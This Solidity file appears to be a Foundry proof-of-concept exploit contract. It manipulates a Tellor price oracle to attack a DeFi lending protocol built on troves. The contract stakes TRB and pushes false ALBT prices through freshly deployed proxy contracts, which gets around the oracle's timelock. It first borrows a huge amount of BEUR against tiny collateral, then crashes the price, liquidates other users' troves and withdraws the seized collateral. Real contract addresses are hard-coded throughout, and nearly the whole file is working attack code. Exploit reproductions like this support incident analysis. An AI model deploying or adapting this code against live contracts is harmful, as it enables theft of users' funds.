// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/interfaces/IERC20.sol";
import "forge-std/console.sol";
import "./interfaces.sol";

contract Attacker {
    address constant TRB = 0xE3322702BEdaaEd36CdDAb233360B939775ae5f1;
    address constant TELLOR_FLEX = 0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B;
    address constant TROVE_FACTORY = 0x3bB7fFD08f46620beA3a9Ae7F096cF2b213768B3;
    address constant WALBT = 0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632;
    address constant BEUR = 0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81;

    ITrove firstTrove;
    ITrove secondTrove;

    function attackBorrow() external {
        _submitValue(5_000_000_000 ether);
        _createFirstTroveAndBorrow();
        _createSecondTrove();
    }
    
    function attackLiquidate() external {
        _submitValue(100_000_000_000);
        _liquidateTrovesInDebt();
        _buyCollateral();
    }

    function _submitValue(uint256 value) internal {
        address _delegatooor = _deployDelegatooor();

        uint256 stakeAmount = ITellorFlex(TELLOR_FLEX).getStakeAmount();
        require(IERC20(TRB).balanceOf(address(this)) >= stakeAmount, "Not enough TRB balance to stake");
        IERC20(TRB).transfer(_delegatooor, stakeAmount);

        (bool success, ) = _delegatooor.call(abi.encodeWithSignature(
            "updatePrice(uint256)",
            value
        ));
        require(success, "Not updated price");
    }

    function _createFirstTroveAndBorrow() internal {
        // @note This token will be the collateral one
        firstTrove = IOriginalTroveFactory(TROVE_FACTORY).createTrove(WALBT);
        IERC20(WALBT).transfer(address(firstTrove), 0.1 ether);
        // updates the collateral
        firstTrove.increaseCollateral(0, address(0));
        // mints BEUR to the user and records the debt
        firstTrove.borrow(address(this), 100_000_000 ether, address(0));

        console.log(
            "Balance BEUR after borrow (no decimals): %s",
            IERC20(BEUR).balanceOf(address(this)) / 1e18
        );
    }

    function _createSecondTrove() internal {
        secondTrove = IOriginalTroveFactory(TROVE_FACTORY).createTrove(WALBT);
        
        uint someAmount = 13 ether;
        IERC20(WALBT).transfer(address(secondTrove), someAmount);
        secondTrove.increaseCollateral(0, address(0));

        console.log(
            "Balance WALBT after second trove creation: %s",
            IERC20(WALBT).balanceOf(address(this))
        );
    }

    function _liquidateTrovesInDebt() internal {
        // collect troves
        IOriginalTroveFactory factory = IOriginalTroveFactory(TROVE_FACTORY);
        address currentTrove = factory.firstTrove(WALBT);
        uint troveCount = factory.troveCount(WALBT);
        console.log("TroveCount: %s", troveCount);
        address[] memory troves = new address[](troveCount);
        troves[0] = currentTrove;
        for (uint i = 1; i < troveCount; i++) {
            currentTrove = factory.nextTrove(WALBT, currentTrove);
            troves[i] = currentTrove;
        }

        // liquidate all troves
        ITrove trove;
        for (uint i; i < troves.length; i++) { // no sufficient BEUR to pay for last troves
            trove = ITrove(troves[i]);
            uint debt = trove.debt();
            console.log(
                "Trove %s , debt: %s",
                i,
                debt
            );
            if (debt > 0 && trove != secondTrove && trove != firstTrove) {
                trove.liquidate();
                console.log("Liquidated");
            }
        }
    }

    function _buyCollateral() internal {
        IERC20(BEUR).approve(address(secondTrove), type(uint).max);
        secondTrove.repay(type(uint).max, address(0));
        secondTrove.decreaseCollateral(
            address(this), 
            IERC20(WALBT).balanceOf(address(secondTrove)), 
            address(0)
        );
        
        console.log(
            "Balance WALBT end (no decimals): %s",
            IERC20(WALBT).balanceOf(address(this)) / 1e18
        );
    }

    function _deployDelegatooor() internal returns (address delegatooor) {
        address _attacker = address(this);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)
            mstore(add(ptr, 0x14), shl(0x60, _attacker))
            mstore(
                add(ptr, 0x28),
                0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000
            )
            delegatooor := create(0, ptr, 0x37)
        }
        require(delegatooor != address(0), "Deploy delegatooor failed");
    }

    function updatePrice(uint256 _value) external {
        ITellorFlex tellorFlex = ITellorFlex(TELLOR_FLEX);
        
        uint256 stakeAmount = IERC20(TRB).balanceOf(address(this));
        IERC20(TRB).approve(TELLOR_FLEX, stakeAmount);
        // required to submit a value as price
        tellorFlex.depositStake(stakeAmount);

        bytes memory queryData = abi.encode("SpotPrice", abi.encode("albt", "usd"));
        bytes32 queryId = keccak256(queryData);
        bytes memory value = abi.encode(_value);

        /**
         * @note There is a timelock inside this function, so same address
         * can't submit another value during a certain period. Hence why 
         * the attacker deploys a value submitter for each submission.
         */
        tellorFlex.submitValue(
            queryId,
            value,
            0,
            queryData
        );

        console.log("Price updated to: %s", _value);
    }
}